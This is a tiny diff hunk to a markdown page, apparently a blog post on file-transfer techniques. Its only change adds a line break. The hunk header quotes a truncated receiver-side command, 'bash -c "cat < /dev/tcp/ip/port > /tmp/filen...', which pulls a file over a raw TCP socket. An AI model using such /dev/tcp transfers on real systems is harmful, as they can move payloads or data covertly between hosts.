@@ -159,5 +159,6 @@ On the receiver side, this command `bash -c "cat < /dev/tcp/ip/port > /tmp/filen
 	<img width="775" height="24" src="https://fir3wa1-k3r.github.io/imgs/file_13.png">
 </p>
 <br>
+<br>
 
 Still much more techniques are yet to come..!!
